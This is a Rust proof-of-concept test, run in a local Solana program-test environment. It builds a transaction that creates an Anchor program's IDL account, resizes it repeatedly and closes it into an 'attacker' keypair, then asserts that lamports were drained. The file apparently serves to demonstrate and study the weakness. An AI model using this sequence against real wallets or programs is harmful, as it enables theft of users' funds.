use {
    anchor_lang::{
        idl,
        prelude::*,
        solana_program::{self, instruction::Instruction, pubkey::Pubkey},
        InstructionData,
    },
    memo::accounts::Memo,
    solana_program_test::*,
    solana_sdk::{
        instruction::AccountMeta, signature::Keypair, signer::Signer, transaction::Transaction,
    },
};

#[tokio::test]
async fn test_unexpected_drain() {
    // Program ID for the memo program
    let program_id = memo::ID;

    // Create program test environment
    let program_test = ProgramTest::new("memo", program_id, anchor_processor!(memo));

    // Start the test environment
    let (banks_client, payer, recent_blockhash) = program_test.start().await;

    // Step 1: Call the memo program, nothing unexpected
    let memo_text = "Hello, Solana!".to_string();

    let memo_accounts = Memo {};
    let memo_ix = Instruction {
        program_id,
        accounts: memo_accounts.to_account_metas(None),
        data: memo::instruction::Memo { memo: memo_text }.data(),
    };

    let tx = Transaction::new_signed_with_payer(
        &[memo_ix],
        Some(&payer.pubkey()),
        &[&payer],
        recent_blockhash,
    );

    // Send the transaction
    banks_client.process_transaction(tx).await.unwrap();
    println!("Memo transaction processed successfully");

    // Step 2: Create IDL account resize it to be as big as possible and close into the attacker's account
    let attacker = Keypair::new();
    let initial_attacker_balance = 0;

    let (_, idl_address) = idl_instructions::find_base_and_idl_addresses(program_id);

    let mut ixs = Vec::new();
    let create_idl_ix = idl_instructions::create_idl_account(program_id, payer.pubkey(), 10_000);
    ixs.push(create_idl_ix);

    // Resize 30 times, looks like the best we can do until hitting MaxInstructionTraceLengthExceeded
    let mut data_len = 10_000;
    for _ in 0..30 {
        data_len += 10_000;
        let resize_idl_account = idl_instructions::resize_idl_account(
            program_id,
            idl_address,
            payer.pubkey(),
            data_len, // Resize to a larger size
        );
        let resize_idl_ix = resize_idl_account;
        ixs.push(resize_idl_ix);
    }

    let close_account_ix = idl_instructions::close_idl_account(
        program_id,
        idl_address,
        payer.pubkey(),
        attacker.pubkey(),
    );
    ixs.push(close_account_ix);

    let create_tx = Transaction::new_signed_with_payer(
        &ixs,
        Some(&payer.pubkey()),
        &[&payer],
        recent_blockhash,
    );

    // Send the transaction to create IDL account
    banks_client.process_transaction(create_tx).await.unwrap();
    println!("IDL account created successfully and closed");

    // Verify the attacker received the funds
    let final_attacker_balance = banks_client.get_balance(attacker.pubkey()).await.unwrap();

    assert!(
        final_attacker_balance > initial_attacker_balance,
        "Attacker should have received funds from closing the account"
    );

    println!(
        "Attack successful: Attacker drained {} lamports",
        final_attacker_balance - initial_attacker_balance
    );
}

#[macro_export]
macro_rules! anchor_processor {
    ($program:ident) => {{
        fn entry(
            program_id: &solana_program::pubkey::Pubkey,
            accounts: &[solana_program::account_info::AccountInfo],
            instruction_data: &[u8],
        ) -> solana_program::entrypoint::ProgramResult {
            let accounts = Box::leak(Box::new(accounts.to_vec()));

            $program::entry(program_id, accounts, instruction_data)
        }

        solana_program_test::processor!(entry)
    }};
}

// Custom implementation of IDL instructions since they're not available in the current anchor_lang version
mod idl_instructions {
    use anchor_lang::solana_program::example_mocks::solana_sdk::system_program;

    use super::*;

    // Create an IDL account
    pub fn create_idl_account(program_id: Pubkey, payer: Pubkey, data_len: u64) -> Instruction {
        let (base, idl_address) = find_base_and_idl_addresses(program_id);
        Instruction {
            program_id,
            accounts: vec![
                AccountMeta::new(payer, true),
                AccountMeta::new(idl_address, false),
                AccountMeta::new_readonly(base, false),
                AccountMeta::new_readonly(system_program::ID, false),
                AccountMeta::new_readonly(program_id, false),
            ],
            data: initialize_idl_account_data(data_len),
        }
    }

    // Resize an IDL account
    pub fn resize_idl_account(
        program_id: Pubkey,
        idl_address: Pubkey,
        authority: Pubkey,
        new_size: u64,
    ) -> Instruction {
        Instruction {
            program_id,
            accounts: vec![
                AccountMeta::new(idl_address, false),
                AccountMeta::new(authority, true),
                AccountMeta::new_readonly(system_program::ID, false),
            ],
            data: resize_idl_account_data(new_size),
        }
    }

    pub fn find_base_and_idl_addresses(program_id: Pubkey) -> (Pubkey, Pubkey) {
        let base = Pubkey::find_program_address(&[], &program_id).0;
        const SEED: &str = "anchor:idl";
        let idl_address = Pubkey::create_with_seed(&base, SEED, &program_id).unwrap();
        (base, idl_address)
    }

    // Set authority for an IDL account
    pub fn set_authority(
        program_id: Pubkey,
        idl_address: Pubkey,
        current_authority: Pubkey,
        new_authority: Pubkey,
    ) -> Instruction {
        Instruction {
            program_id,
            accounts: vec![
                AccountMeta::new_readonly(idl_address, false),
                AccountMeta::new_readonly(current_authority, true),
            ],
            data: set_authority_data(new_authority),
        }
    }

    // Close an IDL account and reclaim rent
    pub fn close_idl_account(
        program_id: Pubkey,
        idl_address: Pubkey,
        authority: Pubkey,
        recipient: Pubkey,
    ) -> Instruction {
        Instruction {
            program_id,
            accounts: vec![
                AccountMeta::new(idl_address, false),
                AccountMeta::new_readonly(authority, true),
                AccountMeta::new(recipient, false),
            ],
            data: close_account_data(),
        }
    }

    // Create data for initializing IDL account
    fn initialize_idl_account_data(data_len: u64) -> Vec<u8> {
        let mut data = Vec::new();
        data.extend_from_slice(idl::IDL_IX_TAG_LE);
        data.extend_from_slice(
            &idl::IdlInstruction::Create { data_len }
                .try_to_vec()
                .unwrap(),
        );
        data
    }

    // Create data for resizing IDL account
    fn resize_idl_account_data(data_len: u64) -> Vec<u8> {
        let mut data = Vec::new();
        data.extend_from_slice(idl::IDL_IX_TAG_LE);
        data.extend_from_slice(
            &idl::IdlInstruction::Resize { data_len }
                .try_to_vec()
                .unwrap(),
        );
        data
    }

    // Create data for setting authority
    fn set_authority_data(new_authority: Pubkey) -> Vec<u8> {
        let mut data = Vec::with_capacity(40); // 8 + 32
        data.extend_from_slice(idl::IDL_IX_TAG_LE);
        data.extend_from_slice(
            &idl::IdlInstruction::SetAuthority { new_authority }
                .try_to_vec()
                .unwrap(),
        );
        data
    }

    // Create data for closing account
    fn close_account_data() -> Vec<u8> {
        let mut data = Vec::new();
        data.extend_from_slice(idl::IDL_IX_TAG_LE);
        data.extend_from_slice(&idl::IdlInstruction::Close {}.try_to_vec().unwrap());
        data
    }
}
